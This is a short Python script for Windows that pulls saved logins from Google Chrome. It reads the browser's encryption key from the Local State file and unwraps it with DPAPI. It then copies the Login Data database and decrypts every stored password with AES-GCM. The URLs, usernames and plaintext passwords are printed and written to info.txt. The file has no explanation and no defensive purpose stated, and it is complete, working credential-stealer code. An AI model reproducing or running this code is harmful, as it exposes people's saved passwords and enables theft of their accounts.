import os
import json
import base64
import sqlite3
import win32crypt
import tabulate
from Cryptodome.Cipher import AES
import shutil


def getKey() -> bytes:
    with open(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State") as f:
        state = json.loads(f.read())
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def chipGenerate(aesKey: bytes, vec: bytes):
    return AES.new(aesKey, AES.MODE_GCM, vec)


def payloadDecrypt(cipher, payload: bytes) -> bytes:
    return cipher.decrypt(payload)


def passDecrypt(buff: bytes, key: bytes):
    try:
        cipher = chipGenerate(key, buff[3:15])
        decrypted_pass = payloadDecrypt(cipher, buff[15:])
        return decrypted_pass[:-16].decode()

    except Exception as ex:
        print(ex)
        return False


def resOut():
    with open('info.txt', 'w') as f:
        print(tabulate.tabulate(data))
        f.write(tabulate.tabulate(data))


try:
    shutil.copy2(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\default\Login Data", "differ.db")
    conn = sqlite3.connect("differ.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = [['URL', 'NAME', 'PASSWORD']]
    for i in cursor.fetchall():
        url = i[0]
        username = i[1]
        decryptedPass = passDecrypt(i[2], getKey())
        if decryptedPass:
            data.append([url, username, decryptedPass])

    resOut()
    cursor.close()
    conn.close()

except Exception as ex:
    print(ex)

finally:
    os.remove("differ.db")
